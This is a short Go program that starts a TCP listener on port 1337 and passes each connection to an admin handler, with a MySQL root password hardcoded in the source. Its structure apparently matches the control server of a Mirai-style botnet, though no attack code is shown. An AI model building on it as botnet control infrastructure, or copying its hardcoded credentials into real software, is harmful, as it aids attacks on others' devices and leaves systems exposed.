package main

import (
	"fmt"
	"net"
	"time"

	"github.com/fatih/color"
)

var database *Database = NewDatabase("localhost:3306", "root", "pandapwd", "pandatable")

func main() {
	color.Green("Network started...")
	tel, err := net.Listen("tcp", "0.0.0.0:1337")
	if err != nil {
		fmt.Println(err)
		return
	}
	for {
		conn, err := tel.Accept()
		if err != nil {
			break
		}
		go initialHandler(conn)
	}
	color.Red("Network stopped...")
}

func initialHandler(conn net.Conn) {
	defer conn.Close()
	conn.SetDeadline(time.Now().Add(10 * time.Second))
	buf := make([]byte, 2048)
	_, err := conn.Read(buf)
	if err == nil {
		NewAdmin(conn).Handle()
	}
}
